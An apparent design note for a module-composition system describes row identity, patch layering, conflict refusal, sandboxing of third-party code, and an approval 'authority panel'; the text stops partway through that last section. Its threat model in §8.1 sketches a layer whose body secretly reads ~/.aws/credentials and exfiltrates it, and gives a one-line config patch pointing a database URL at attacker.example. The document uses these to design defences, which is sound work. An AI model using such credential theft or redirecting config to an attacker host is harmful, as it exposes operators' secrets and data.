# 426: composition rows, layered patches, admitted extension (resolved)

Design note for roadmap item 426, the resolution to item 424(a).

**Build status.** Slice S1 (§11), the row table, is BUILT: the `composition`
document, label declaration with origin scoping, the claim assertion checked
against the component header, header-only resolution, typed row config, and the
row table in the IR and the manifest. `src/revl/composition.py`,
`revl composition`, `docs/composition-rows.md`, `tests/test_composition_rows.py`.
Item 424's residual R2 (the `granted` clause, its empty default and the
`requires`-subset check) rode with it, which is where 424 slice A1 files it.
S2 through S6 are still design only, and §11 says what each waits on.

**This document supersedes two earlier notes and they are both kept:**

- `docs/design/426-composition-layers-truc-first.md` (design A), which put
  identity, distribution and re-admission in truc.
- `docs/design/426-composition-layers-composition-first.md` (design B), which
  made the composition a declared, checked artifact and derived identity from
  G2.

Neither is withdrawn. Each contains an adversarial finding the other missed,
and each finding is real. Read them for the arguments; read this one for what
was decided. Where this note and a source note disagree, this note wins, and
every place it overrides a source note's rule is marked **OVERRIDE** with the
reason.

---

## 0. The eight decisions, in one table

The architect resolved the eight open questions before this note was written.
Everything below is the working out, not the deciding.

| # | Decision | Section |
|---|---|---|
| 1 | Identity is a **declared stable label scoped to its origin**. The claim set is what G2 checks, not what names the row. | §1 |
| 2 | A patch **addresses the provision claim**, never a file and never a component name. An address that resolves to nothing is a REFUSAL. | §2 |
| 3 | Resolution is a **pure fold that never calls the gate**. | §3 |
| 4 | **Precedence never chooses a provider.** Peer conflicts refuse; only the operator's site layer resolves, by naming both sides. | §3.4 |
| 5 | **Incremental admission via `admit_into`.** Activation stays additive-only, blocked by G7, not by effort. | §5 |
| 6 | **Non-first-party rows compile under the item-329 untrusted-author profile, always.** | §4 |
| 7 | **Distribution is truc's; semantics are the composition's.** On disagreement the composition is source of truth and the lock is the integrity proof. | §7 |
| 8 | **The composition is declared in revl.** | §6 |

The ninth thing, which was not decided in advance and is the real work in this
note, is the authority panel (§8). Both source designs found a different
CRITICAL in it, from opposite framings, and both survive the other's fix.

---

## 1. Row identity: a declared label, bound to a checked claim set

### 1.1 The two objects, kept apart

A **row** is one component placed into one composition. It carries:

| field | role |
|---|---|
| `label` | **identity**. Declared, stable, scoped to its origin. |
| `claims: set[(key, realm)]` | the **contract**, checked by G2. Also an address (§2). |
| `component: Name` | provenance and disambiguation. Never identity. |
| `origin` | the document that declared the row, and its truc. Decides trust class (§4). |
| `config` | data. |
| `pin` | `sourceHash` from `truc.lock`. Integrity, never identity. |

Design B's argument for claim-set identity is accepted as far as it goes:
`lower._link` keys `provider_of` on `(key, realm)` (`lower.py:9426`) and G2
enforces at most one provider per pair (`lower.py:9443`), so the claim sets of
an admissible composition's rows are pairwise disjoint and uniqueness costs
nothing. That is why claims are the **address** in §2.

But design A's counter is decisive for **identity**. A claim set is a function
of upstream's surface. A minor version that adds one provision to an existing
component silently renames every row that component backs, and every layer
written against the old id fails closed. B conceded that claimless rows need a
namespaced label anyway. Generalising the label, rather than bolting it onto
the one case that forces it, buys a name that survives BOTH a component rename
AND a surface addition, and costs one declared word per row.

**OVERRIDE of B §2:** the row id is not the claim set. It is the label. B's
"adding a provision is a remove plus an add, and I will defend it" is
explicitly reversed. B's defence ("a model in which upstream can silently grow
the surface of a row a third party has patched is a model in which the patch's
meaning changes without the patch changing") is answered in §1.4, not ignored:
the growth is surfaced loudly, it simply does not destroy the name.

### 1.2 Scoping, and two origins declaring the same label

A label is declared where the row is declared, and it is scoped to that
document's **origin**. An origin is either the project itself (spelled `.`) or
a truc key from `truc.toml`'s `[trucs]` table, which is also the vendor
directory name and the lock row key.

The fully qualified label is `<origin>::@<label>`. Inside its own document a
bare `@db` is the local spelling and resolves to the document's own origin.
Cross-origin references are always fully qualified.

**Two origins declaring the same label do not collide**, because they are two
different fully qualified labels: `.::@db` and `acme_pg::@db` are distinct
names for distinct rows. There is no squatting policy to write, and there is
no registry of labels, because the namespace is the one the operator already
owns: the person editing `truc.toml` chooses the `[trucs]` keys, and the
project's own origin is reserved and unmintable by anyone else.

Two labels declared with the same spelling **within one origin** is a refusal
at parse time, the same shape as a duplicate component name
(`compiler.py:~412`).

This is A's rejected-identity argument turned around and made to work. A
rejected "a declared `id` in source" on the grounds that "two packages can then
claim the same id, and the resolution needs a squatting policy". That is true
of a FLAT id space. It is not true of one scoped by the `[trucs]` key, which is
exactly the per-project namespace A's own canonical id used. The merge keeps A's
namespace and drops A's requirement that the local part be the component name.

### 1.3 Binding a label to its claims

The label declaration **asserts** the claim set, and the assertion is checked
against the component's header:

```revl
composition Harness {
  row @db from "trucs/pg_database/component.rvl" provides db
  row @cache from "src/cache.rvl" provides cache, index
  row @routes from "src/harness_routes.rvl" provides nothing
}
```

Three properties fall out, and B's §3 argument for them carries over unchanged:

- `provides k: S` lives in the component header, and header-only lowering
  already exists (`_component_header_stub`, `lower.py:4907`). So the whole row
  table, every address resolution, and the entire wiring diff are computable
  **without lowering a single component body**. Only final admission needs
  bodies. `revl layer check` is cheap by construction.
- The document cannot lie about the wiring: an assertion that disagrees with
  the header is a refusal naming both.
- A claimless row (`provides nothing`) is legal and needs no special case,
  because the label, not the claim set, is the identity. This deletes B's
  "roughly a third of a real composition's rows are sinks and get a
  hand-written id with no checked relation to the wiring" cost: under a label
  scheme every row has a hand-written id, so the sink is not a seam any more,
  it is the ordinary case.

### 1.4 What happens when upstream's surface changes

The asymmetry is the whole point of decision 1, and it is deliberate in both
directions.

**A provision is ADDED upstream.** The row keeps its label. Every layer
addressing `@db` still resolves. The addition is not silent: it is a new
`(key, realm)` the composition now serves, so it appears in the WIRING panel as
`row @db now also provides pool`, it is a new address that other rows may
resolve against, and G2 still refuses it if something else already claims
`pool`. The composition document's `provides db` assertion becomes a strict
subset of the header's actual claims, which is reported and admitted. The
operator may tighten the assertion in one edit; nothing forces them to.

**A provision is REMOVED upstream.** Refusal. The composition asserted `db` and
the row no longer provides it, so a consumer's requirement is now unmet, which
G3 would catch anyway; catching it at row resolution gives a better message
naming the row, the lost key, the layer that depended on it, and the pinned
version that dropped it.

**The component is RENAMED upstream.** Nothing happens. `component` is
provenance. This is B's rename transparency, kept.

**The label is renamed by the composition's own owner.** Loud: every layer
addressing it refuses, which is correct, because the label is the published
name of an extension point and renaming it is a breaking change the owner
chose to make.

### 1.5 What identity is NOT

- Not a content hash. A hash is the pin. It does not survive an edit, which is
  the first requirement.
- Not the component name. `Logger` from two trucs is two different
  supply-chain facts and the approval panel has to show which.
- Not the file. §2.
- Not the claim set. §1.1.

---

## 2. Addressing: the provision claim

**A patch addresses a row by its provision claim, or by its label.** Two
spellings, both exact, both refusing rather than no-opping.

### 2.1 Against files, which is settled

Design B's reason is the operative one and it is stronger than A's five:
`compile_files` merges every root module into one `Program` before `_link` sees
anything (`compiler.py:410`), and the manifest entry carries `file` as
provenance only. **A file-addressed patch names an object the checker does not
model**, so the patch itself cannot be checked, only its result can. That is
DSH's position and it is why DSH's layering is unverified: the layering system
and the checking system speak about different objects.

A's supporting reasons survive and are worth keeping in the record: the gate's
replacement primitive is component-granular and there is no file-granular one;
every existing report (`audit_diff.crossings`, `composition_diff._components`,
`registry._entry_index_row`, the manifest) is already a component-keyed table;
and a file is a packaging fact, so moving a component between files would be a
remove plus an add that changed nothing.

### 2.2 Against component names

Also settled, and B's argument is the operative one. If the override must name
`PgDatabase`, the patch is coupled to an implementation detail upstream may
rename, and the patch author had to read upstream's source. If it names `db`,
it is coupled to the contract upstream published, and the author had to read
upstream's INTERFACE. That difference is the difference between an ecosystem
and a fork.

### 2.3 The two spellings, under decision 1

A's two spellings survive decision 1 and become sharper, because under a label
scheme the two axes are genuinely independent:

| Spelling | Resolves to | Survives a label rename | Survives a re-provision |
|---|---|---|---|
| `key("db")` | whatever row currently claims key `db` in the shared realm | yes | no (refuses if the key moved rows) |
| `@db`, or `acme_pg::@db` | that exact row | no (refuses, loudly) | yes |

Both spellings are useful and the choice is a choice about failure mode. A
third-party layer overriding a contract writes `key("db")`, because it wants to
follow the contract wherever it moved. A site layer resolving a conflict
between two named stack layers writes the fully qualified label, because it
wants to name exactly the row it means and to hear about it if that row is
gone.

Key-addressing is well defined only because G2 guarantees at most one provider
per `(key, realm)`. Realms fall out for free: `key("kv", realm: "tenant_a")` is
a different address from `key("kv", realm: "tenant_b")`, so two layers adding
per-tenant rows never collide, and this needs no new rule (B §4).

The limitation B named is kept: `isolate k in realm(...)` is declared in the
component source, not in the composition, so a layer cannot re-realm somebody
else's component. Two layers that both want `kv` in the shared realm are
refused and must coordinate at the source level or use the sanctioned
multi-provider shape (`docs/distribution-model.md`). Moving `isolate` into the
composition document is a plausible follow-on and is out of scope.

### 2.4 An address that resolves to nothing is a REFUSAL

Never a no-op. This is A's sharpest single difference from DSH, where a patch
whose target id vanished does nothing and the operator learns at runtime. The
refusal names the address, the layer that wrote it, and what the target
provides instead:

```text
refused: layer `obs_kit` addresses key `logger`, which no row claims in
  composition `Harness` at the pinned versions.
  `std_logger` at 2.0.0 claims `logging` (renamed from `logger` in 2.0.0).
  Address `key("logging")`, or repin `std_logger` to a version claiming
  `logger`, or address the row directly as `std_logger::@logger`.
```

---

## 3. Layers, operations, and resolution

### 3.1 The levels

| Rank | Level | Who writes it | Peer semantics |
|---|---|---|---|
| 0 | base composition | the composition's owner | not a patch level |
| 1 | stack layers | third parties, named in the base or in `truc.toml` | **peers: conflicts refuse** |
| 2 | site layer | the operator. Exactly one. | resolves, by naming both sides |
| 3 | invocation overlay | CLI and environment | values only, never structure |

**OVERRIDE of A §3.1:** A had five levels (base, stack, project patch, home
patch, invocation) with a rank order and "the higher rank wins". Decision 4
collapses the two middle patch levels into one site layer, because the rank
order between "project patch" and "home patch" is precisely a precedence rule
that chooses a provider, which decision 4 forbids. A project patch and a home
patch are both the operator; giving them a silent precedence between them is
the same defect at smaller scale. If a project wants a committed site layer and
a user wants a machine-local one, they are two files that merge under the same
peer rules, and a conflict between them refuses.

### 3.2 The operations

Four, and no more.

| operation | meaning |
|---|---|
| `add <row>` | introduce a row. Refused if its label collides in its origin, or its claims intersect any existing row's claims. |
| `remove @id` | withdraw a row. |
| `replace @id with <row>` | swap the implementation behind a row. **The replacement must claim exactly the same set.** The label is preserved. |
| `configure @id { field: value }` | merge fields into a row's config. Restricted by §8.5. |

**No positional operation.** No `insert before`, no priority, no ordering. Load
order is derived by Kahn over the dependency graph (`lower.py:9577`), not
declared, so a position operation would be inventing a concept the gate does
not have in order to imitate one DSH's flat list has. B is right that this is a
straight composition-first win: in DSH stack order IS resolution order, so DSH
must specify it; in revl resolution order is computed from the wiring, so no
layer ever gets to reorder anything.

**`replace` is claim-preserving**, which is the second determinism lever: a
replacement claiming exactly what it replaced can never create or destroy a G2
conflict. Changing what a row claims is expressible, but only as `remove` plus
`add`, which is loud in the diff. Note this is orthogonal to §1.4: upstream
growing a row's surface is not a `replace`, it is a re-pin, and it keeps the
label.

**`configure` is not a dictionary write.** A's §3.4 point stands: revl has no
config fields, and a component's configuration is another component providing a
service, so `configure` desugars during the fold to a `replace` of the row
currently claiming the config key with a **synthesized** row: same service, same
methods, same constants, with the named field's constant swapped. A config row
is a component all of whose provide-method bodies are constant expressions,
which the compiler can decide syntactically:

```revl
service Sampling {
  fn rate_pct() -> Int
  fn enabled() -> Bool
}

component SamplingConfig provides cfg: Sampling {
  provide cfg {
    fn rate_pct() = 10
    fn enabled() = true
  }
}
```

Synthesis is a pure function of the service declaration, the current constants
and the overrides, so it is deterministic and diffable, and the synthesized
source goes into the row table so the operator reads the exact component that
will be admitted. The derivation machinery exists: `revl test --mock-requires`
(item 60, `docs/auto-mocks.md`) already derives a provider from a service
declaration alone.

Two rules keep it honest, both from A §3.4:

- `configure` against a non-config row is a **refusal**, not a best-effort
  patch. DSH would happily overwrite a key that nothing reads.
- A value that does not fit the declared return type **does not admit**. The
  synthesized component fails to compile and the refusal names the field and
  the declared type. In DSH the equivalent typo reaches runtime. Config typos
  are the most common way a layered composition breaks in practice, and this
  turns them into a refusal before anything runs.

### 3.3 Resolution is a pure fold, and the gate is never inside it

Both source designs reached this and for different reasons. Both reasons are
load-bearing and both are stated.

**A's reason (correctness, not performance).** Per-operation admission opens a
determinism trap. Take `remove key("logger")` and `add otel_logger::@logger`,
where both concern key `logger`. Admitting per operation, `remove` then `add`
succeeds and `add` then `remove` fails on G2 at an intermediate state, so the
verdict depends on the order the ops happened to be listed in. Folding first
means no intermediate state exists: the fold produces "key `logger` is claimed
by `otel_logger::@logger`", the delta's withdrawal set is `{StdLogger}`, and one
`compile_files(newRows, manifest=running, replacing=("StdLogger",))` call sees
the whole change at once. `replacing` exists for exactly this
(`compiler.py:388`, "additional components being withdrawn in the same
admission").

**B's reason (the resolver is not on the trusted path).** `_link` still runs G2
and G3 unchanged over the assembled composition (`lower.py:9372` takes
`ambient_components` and the new components together). The layer resolver is a
pre-check whose only privilege is to produce a better message. A bug in the
resolver therefore cannot admit a composition the linker would refuse; it can
only be wrong in the direction of refusing something admissible, which is a
usability bug and not a soundness one.

The fold, precisely:

1. Start from the base row table.
2. Apply level 1 stack layers. Peer conflicts refuse (§3.4), so the result is
   independent of the order in which stack layers are listed.
3. Apply the site layer, which may resolve a level-1 refusal by naming both
   sides.
4. Apply the invocation overlay, values only.
5. Record, per row, the ordered provenance: every (level, layer, op) that
   touched it, and which one won.

Every input is an ordered list in a file or a lock-pinned hash. Nothing depends
on filesystem iteration order, directory listing order, wall-clock time, or
fetch completion order.

**The registry ranker is not in the fold.** A layer names a truc by a
lock-pinned identity, never by "whatever the registry ranks best today".
`registry.resolve`'s least-authority-then-evidence ranking is an authoring-time
affordance that `truc add` may consult when a human is choosing a package; it is
never consulted when a lock exists. This is load-bearing twice: it makes
resolution reproducible across machines and time, and it keeps 428 F5 (the
registry grading publisher-written evidence, a fabricated attestation improving
rank) off the resolution path entirely.

### 3.4 Decision 4: precedence never chooses a provider

The sentence this design should be judged on, from B §4:

> **No provider is ever chosen by precedence.** Between peer layers, a claim
> collision is refused. Only the operator's own layer resolves it, and only by
> naming both sides.

| situation | outcome |
|---|---|
| two stack layers `add` rows with intersecting claims | **REFUSED** |
| two stack layers `replace` the same row | **REFUSED** |
| two stack layers `configure` the same row and field, different values | **REFUSED** |
| two stack layers `configure` the same row, disjoint fields | merged, commutative |
| two stack layers `remove` the same row | idempotent, allowed |
| one stack layer `remove`s, another `replace`s or `configure`s the same row | **REFUSED** |
| the site layer does any of the above over a stack layer | the site layer wins, no refusal |

**OVERRIDE of A §3.5, and A's argument answered.** A allowed an intra-layer
collision and let the later `[stack]` entry win, on the grounds that "refusing
would make bundles un-stackable, and un-stackable bundles have no ecosystem
story, which is the item's whole objective". That argument does not hold up.
Bundles stack fine under refusal as long as they touch disjoint rows, which is
the normal case; the refusal fires only when two bundles fight over one key, and
then the operator writes one line in the site layer and is done. What A's rule
actually buys is that a composition's provider can change because someone
reordered a list, which is the DSH failure mode this item exists to beat. A's
three mitigations (a declared `touches` summary, a provenance record, an
authority diff computed against the base) all make the win VISIBLE; none makes
it CHOSEN by the operator, and decision 4 is that it must be chosen.

A's `touches` declaration survives, demoted to what it honestly is: a
convenience that lets `truc stack check` report a collision at edit time before
anything is fetched, and lets `truc apply` print a layer's reach without
resolving it. It is enforced (a layer whose ops address something outside its
own `touches` is refused) so it is checkable rather than decorative, but it is
not a security property: an author who wants to touch a row simply lists it.

Refusals carry **layer provenance**, which is B's contribution and is the whole
reason the resolver's pre-check exists. G2's own message names two components
("key `db` is provided by both PgDatabase and SqliteDatabase (G2)"), and after
layering that message is useless because the operator wrote neither component:

```text
layer conflict: key `db` is claimed by
  layer acme::pg@2.1      row acme_pg::@db,     component PgDatabase
  layer corp::sqlite@0.4  row corp_sqlite::@db, component SqliteDatabase
Neither layer is preferred. Resolve it in your site layer:
  resolve key("db") to acme_pg::@db over corp_sqlite::@db
(this is G2, provision disjointness, seen at the layer level)
```

The reasoning for the site layer's exemption is not ergonomic convenience.
Refusal is only meaningful BETWEEN PEERS. The operator is not a peer of the
layers; the operator is the person the refusal is shown to. So there has to be
exactly one level at which "I decide" is expressible, and it is the level a
human owns.

---

## 4. Confinement: the row is the unit

**Decision 6. Every non-first-party row compiles under the item-329
untrusted-author profile, always.**

`AdmissionProfile.untrusted_author(granted)` (`admit_profile.py:132`) sets
`no_extern`, a `granted` reach allowlist, `no_declassify` and `taint_strict`.
`check_no_extern` (`:158`) refuses a root program that declares any `extern`,
structurally, on the parsed AST, before any host body is lowered or run.
`check_no_host_extern_reach` (`:213`) closes the import-and-call bypass across
the whole transitive module closure (items 330 and 329/transitive).

The consequence is the one that matters for §8: **there is no host code in a
non-first-party row for a declaration to lie about.** A fetched row reaches the
world only through externs the PROJECT declared, in the project's own sources,
which the project's author reviewed and which `revl audit` already enumerates.

This makes the row the unit of four things at once: identity, addressing,
incremental admission, and confinement. One boundary doing four jobs is the
argument for the merge.

### 4.1 Who is non-first-party, and who decides

This is where the merge nearly introduced a hole, and §9.3 states it as the new
critical. The rule:

> **A row's trust class is the trust class of the DOCUMENT THAT DECLARED THE
> ROW, not of the file the row points at.** The base composition and the site
> layer are first-party. Every stack layer is non-first-party, and every row it
> introduces is non-first-party, whatever path its `from` clause names. A stack
> layer's `from` path must resolve inside its own truc's vendored directory, or
> the layer is refused.

The trust class is a DISTRIBUTION fact (which truc shipped this document, read
from the lock) and decision 7 says distribution facts are truc's. The
composition may read it and may not override it. No layer can raise its own
trust class; the only thing that can is the operator moving code into the
project's own sources, which is a reviewed act with a diff.

### 4.2 The escape hatch, default closed, differently shaped

Some legitimate layers genuinely need a new host crossing: a database driver, a
telemetry exporter. Those cannot pass `no_extern`, so `truc apply` **refuses
them by default**, naming the bodies:

```text
refused: layer `otel_kit` ships 2 host bodies.
  otel_kit::@logger  extern `host_http_post`  (@py, @ts)
  otel_kit::@logger  extern `host_env_read`   (@py)
A non-first-party row's host code is not checked against its declarations, so
its authority cannot be measured, only quoted. Re-run with --trust-host-code to
admit it as reviewed first-party code.
```

`--trust-host-code` admits it and changes the SHAPE of the authority panel, not
just its content (§8.4). This is A §8 F3, kept verbatim in intent.

---

## 5. Re-admission cost

### 5.1 Checking generalises completely, today, with no new engine

`gate.admit_into(source, manifest)` (`gate.py:188`) already IS incremental
patch admission at the verdict level. A resolved patch is a delta: rows
removed, rows added, config changed. The check is:

1. Build the ambient manifest with the removed and replaced rows' components
   filtered out. This is exactly what `compiler.py:532` already does for
   `replacing`, by name, before `_link` runs.
2. Compile only the added and replacing rows' sources with that `manifest=`.
3. G2 and G3 span the union, because `_link` takes `ambient_components` and the
   new components together (`lower.py:9372`).

The evidence is already in the suite.
`test_hot_swap_compiles_a_lone_file_against_the_running_manifest`
(`tests/test_manifest.py:44`) asserts that compiling one file against a running
manifest yields `admitted["components"] == ["PgDatabase"]` while
`admitted["manifest"]["components"]` is the whole composition and `loadOrder`
covers both. **The verdict spans the whole composition; the compile spans only
the delta.**

So the cost of answering "is this layer safe to apply" is one compile of the
patched rows, not of the composition. That is the cost that matters, because it
is the cost of the operator's decision.

A's class partition (§4.1 there) is the reason this is sound rather than
merely observed, and it is kept:

- **body-local** rules (G1, G4 declared reach, G6, taint flow within a body,
  `_check_spawn_attenuation`) recompute for the patched rows only;
- **interface-local** rules (G2, G3, `admission._service_compatible`,
  `_admit_handoff_replacement`) read every row's DECLARED interface plus the
  candidate's body, which the running manifest already carries;
- **fold-over-rows** facts (the audit boundary surface, capability totals, the
  item-33 policy ceiling, distributability) are a union over per-row records
  that `audit_diff.crossings` already produces keyed per component.

With A's three invariants, which are the honest preconditions:

**I1.** No admission rule may read a row's body across a row boundary. Taint
satisfies this because `Untrusted[T]` is a type qualifier and therefore appears
in service declarations, so `_service_compatible` catches a taint-widening
interface change. A future rule that is a genuine cross-component dataflow
invisible in declared types must disable incremental admission by name, and the
honest cost is a full re-admission.

**I2.** A distributable row must not `use` another row's source. Structurally
enforced for vendored rows by the truc layout. It does NOT hold for the
project's own sources, which cross-import freely (truc's own `assembler.rvl`
imports `planner.rvl`), so **the project's own sources are one row group,
compiled as a unit**, and a patch touching any of them recompiles the group.
The invariant is claimed only where it holds.

**I3.** A row's cached per-row facts are valid only under the compiler that
produced them. The row table records the compiler identity and any mismatch
downgrades to a full re-admission. This is the same requirement as 428 F2's
"bind the checker's identity into the signed body", which is a useful
convergence: the fix that makes attestation truthful is the fix that makes
cached facts safe.

`--full` compiles every row. On a 200-row composition that is seconds, not
milliseconds, and `truc apply` prints which mode it used and why.

### 5.2 Activation is additive-only, and the reason is G7

This is B's honest limit and it is carried without softening.

`Session._wire_turn` (`session.py:2209`) is a genuine partial link: it emits
only the turn document, plugs its components into the live `driver.root`, and
leaves every existing fiber untouched. A pure `add` layer rides it unchanged
and is a hot, generation-preserving extension today.

A `replace` or `remove` cannot ride it, and the reason is **G7, not effort**.
The withdrawn component's fiber must be disposed, its accumulated teardown must
run in the correct LIFO position, and every consumer resolved to its key must
be re-resolved. What exists is `_dispose_all` plus a full reload
(`session.py:848`); `_abort_swap` is a full reload too. `_wire_turn` refuses
replacement in so many words (`session.py:2189`: "item 330 is additive-only,
hot-swap is `revl_swap`, a separate, operator-gated verb").

**Item 426 ships incremental ADMISSION and inherits whole-generation
ACTIVATION, and says so.** Per-key re-resolution plus a partial dispose in
dependency order is a separate project that puts G7 at risk.

### 5.3 The follow-on worth filing

A `configure`-only patch is the most common third-party patch and precisely
DSH's "override one row and restart", and it still costs a full generation
change today because config is baked into `driver.config` at load. It is the
highest-value narrowing available: a config-only patch changes no wiring, so no
G2 or G3 verdict can change, and the delta is a value substitution. File it as a
follow-on; treating it as part of 426 would drag fiber lifecycle into a
layering item.

| patch shape | admission cost | activation cost |
|---|---|---|
| `add` only | compile the added rows | incremental, no generation change (`_wire_turn`) |
| `configure` only | compile the synthesized config rows | full generation change (follow-on: narrow this) |
| `replace` / `remove` | compile the replacing rows | full generation change |

---

## 6. The composition is declared in revl

**Decision 8.** B's case, kept:

**1. The one real consumer already does it, and had to leave the language to do
it.** revl-harness's `src/manifest.rvl` declares the whole harness in revl as
`mf_files(mode) -> List[Str]` and `mf_config(mode) -> Str`: a file list and a
JSON string. Nothing checks that the component names in `mf_config` correspond
to any component in `mf_files`, or the fields against each component's `config
{}` block. The harness roadmap records two measured instances of exactly this
bug class: a composition listing 31 components while `SessionIndex` was
transitively used but not among them, and a console panel printing a nine-name
string literal while the live boot served thirty-one keys. Both are compile
errors under a declared composition and neither is today.

**2. Layering needs a structure to patch.** `List[Str]` has no rows. That is
424(a) in one sentence.

**3. The bootstrap floor SHRINKS.** `docs/composition-bootstrap.md` establishes
the honest floor: something outside revl must compile the first document.
Today that document is compiled, emitted to Python, exec'd as a module, and
called, and it returns a JSON string the host parses. A declared composition is
compiled and READ: its rows are already in the IR. Stage 1 goes from "compile,
emit, exec, call, parse" to "compile, read the manifest". This is the argument
that turns "a new document form must earn itself" around: the form removes host
machinery rather than adding it.

**4. `placement.py` is subsumed.** It reads `[processes]`, `[tiers]` and
`[config.X]` from TOML (`placement.py:1-12`, `:234-247`): a data description of
a composition, outside the language, cross-referenced against the IR by the
conductor at `placement.py:725` with a G2/G3-style diagnostic. That is the same
shape as a composition document, built twice. Under decision 8, `place @db on
process "provider" backend rust` is a checked statement about a row rather than
a TOML key that might name nothing, and `[config.PgDatabase]` becomes
`configure`, which is the operation §3.2 already defines.

The composition document adds no checker. It is a PRE-LINKER artifact: it
resolves to the same `components` list `_link` already takes, and every
guarantee is still decided by `_link`. What it adds is a name for the thing
`_link` builds.

### 6.1 The surface

```revl sketch
composition Harness {
  use "src/services.rvl"

  row @gate   from "src/components/admission_gate.rvl" provides gate
  row @agent  from "src/components/agent.rvl"          provides agent
    config { max_steps: 8, context_budget: 1200 }
    open   { max_steps, context_budget }
  row @routes from "src/components/harness_routes.rvl" provides nothing
    component HarnessRoutes

  row @db from "trucs/pg_database/component.rvl" provides db
    config { url: "postgres://primary:5432/app", pool: 8 }
    reach  { pg_connect: host("primary.internal:5432") }

  variant "voice" {
    add row @voice from "src/components/voice_plugin.rvl" provides voice
    configure @agent { max_steps: 40, context_budget: 8000 }
  }
}
```

```revl sketch
layer acme::pg for Harness {
  replace key("db") with row @db from "acme/pg_database.rvl"
    component PgDatabase
    config { url: "postgres://primary:5432/app", pool: 8 }
  add row @metrics from "acme/metrics.rvl" provides metrics
}
```

Surface points that carry weight:

- `provides ...` is an assertion checked against the header (§1.3).
- `component <Name>` is optional and disambiguates a file holding several
  components. Provenance, never identity.
- `variant` is the base document's own mode selector (the harness's
  `voice`/`code`/`cli`). `layer X for Y` is a third-party layer. Different
  words because they carry different authority: a variant is written by the
  composition's owner, a layer is not.
- `open { ... }` declares which fields a stack layer may `configure` (§8.5).
- `reach { ... }` is the composition-level authority bound (§8.3).

**A layer document may contain ONLY layer operations.** No `component`, no
`service`, no `extern`, no top-level `fn`. Without this rule a layer is a
component-authoring surface, which is exactly the surface §4 exists to
profile, and the profile would then have to run over the layer document itself.
Grammar refusal, one rule, stated here because neither source note stated it.

**Config is genuinely dynamic in part, and that part stays outside.** The
invocation overlay is the last level and it carries values only, never
structure. The declaration covers structure and static config, which is exactly
the part that has no checking at all today. A declared composition and a
computed file list are not exclusive; `mf_files` keeps working for a
composition whose shape needs computation.

---

## 7. Distribution is truc's; semantics are the composition's

**Decision 7**, which answers the question design A ended on ("does a running
session need a row table DERIVED from a persisted lock, or a row table PRIMARY
in the IR with persistence bolted on, and the answer decides who owns
re-admission").

The answer:

- **truc owns distribution.** Fetching, vendoring, hashing, pinning, the
  `[trucs]` namespace, the lock. A layer IS a truc: it is fetched, hashed,
  vendored and pinned exactly like a component truc, and its entry directory
  carries `layer.rvl` instead of, or beside, `component.rvl`. There is no layer
  registry, no layer version scheme, no layer hash and no layer resolver,
  because truc has all four.
- **The composition owns semantics.** Rows, labels, claims, operations, the
  fold, admission, the authority panel. These are IR facts and the composition
  document is their source.
- **When they disagree, the composition is source of truth and the lock is the
  integrity proof.** Concretely: the row table in the IR is what the gate
  admits and what the panel diffs. The lock does not define a row and cannot
  add one. What the lock does is refuse: a row whose source bytes do not hash to
  its pin is a refusal, and a truc named in the composition with no pin is a
  refusal (428 F3, §10).

This resolves A's adoption objection rather than dismissing it. A's objection
was that truc is a static on-disk vendor-directory tool while the thing that
needs patching is a live in-memory composition, so routing layering through truc
imposes truc's project layout on a runtime that has none, and truc has been
"landed but unused by the harness" for its whole existence. Under decision 7
the harness does not have to adopt truc's layout to get rows: rows are in the
IR, `ship_files()` and `Session.swap` are unchanged, and a composition with no
project directory works with no pins and no layers. truc is what a composition
gains when it wants third-party rows, and the pin requirement bites exactly
then, which is exactly when it should.

The one place the direction is reversed and it is deliberate: **trust class is
a distribution fact** (§4.1). The composition may read it and may not override
it. That is not an exception to decision 7, it is decision 7 applied: which
truc shipped a document is a distribution question.

---

## 8. The authority panel

This is the part that needed real work. Both source designs made the authority
diff the headline of the approval UX. Both then found a CRITICAL in it. The two
criticals are different, they were found from opposite framings, and **neither
design's fix closes the other's**.

### 8.1 The two criticals, and why they compose

**CRITICAL A: the panel derives from DECLARED extern classes, and declarations
are not enforced against `@py` bodies.**

Roadmap 425 F1 states it precisely: `mcp/server.py:54-69` and its siblings pass
no profile, `run.py:706` then `exec`s the compiled body, and
`mcp/approval.py:121-205` classifies from declared extern facts and never
inspects body contents. Three exploits executed, including one where the
approval ticket reads `capabilities: ['notify']` while the `@py` body reads and
exfiltrates a `.env` (`AWS_SECRET_ACCESS_KEY`, `DB_PASSWORD`).

Applied here: `audit_diff.crossings` (`audit_diff.py:204`) is built from the
per-component G8 boundary table, which is built from declared extern classes.
A hostile layer ships a row whose `@py` body reads `~/.aws/credentials` and
posts it, with every extern declared `pure`. The panel prints **zero
additions**. The operator sees "no new authority", applies the layer, and the
design has actively made the attack easier by putting a green panel in front of
it. Every other property (the pin, the determinism, the refusals, the typed
`configure`) survives untouched and is worth nothing, because none of them
constrain what a host body does.

**CRITICAL B: the panel is blind to CONFIG.**

`crossings` emits five token kinds (`emit:`, `host:`, `taint:`, `declassify:`,
`secret:`, `audit_diff.py:211-215`) and none is derived from config.
`diff_reach` (`:261`) compares each extern's DECLARED bound via `_reach_map`
(`:250`), which is read from the audit's flat `externs` list, a source
property. So a layer consisting solely of

```text
configure @db { url: "postgres://attacker.example/app" }
```

changes no crossing token, no declared reach, no secret and no wiring edge.
`composition_diff.diff` reports nothing because membership and edges are
identical. The panel prints the `docs/audit-diff.md` clean line,
`authority-drift: clean, the G8 boundary surface is unchanged`, and the operator
approves an exfiltration. The green line is TECHNICALLY CORRECT, which is the
worst possible failure mode for a safety surface.

**Why neither fix closes the other, and why the merge makes B worse before it
makes it better.**

A's fix removes the unchecked body, so declarations cannot lie. It does nothing
about a config-only layer, which touches no body at all. Worse: A's fix
**promotes** B's critical from one attack among several to THE attack. Once a
non-first-party row cannot ship host code, the only remaining way for a layer
to gain authority is to steer host code that is already there, and the only
lever it has is config. Closing A's critical makes B's the primary surface.

B's fix (composition-declared reach, a config token, a fail-closed headline,
`open`) does nothing about a layer that ships an exfiltrating body declared
`pure`: that layer changes no config at all, so the "unchanged config surface"
conjunct passes and the panel prints clean.

Both fixes are required. Neither is optional.

### 8.2 The trust basis line, and re-keying

Two structural changes come before any panel content.

**The panel opens with a TRUST BASIS line saying what class of check it is
entitled to.** Three states:

| state | meaning |
|---|---|
| `MEASURED` | every non-first-party row admitted under the untrusted-author profile. No host code outside first-party sources. Panel tokens are derived from declarations with no unchecked body behind them. |
| `MEASURED, first-party bodies trusted by premise` | the ordinary state. The project's own externs are unchecked but the operator wrote them and `revl audit` enumerates them. |
| `CLAIMED` | at least one row admitted under `--trust-host-code`. The panel changes SHAPE (§8.4). |

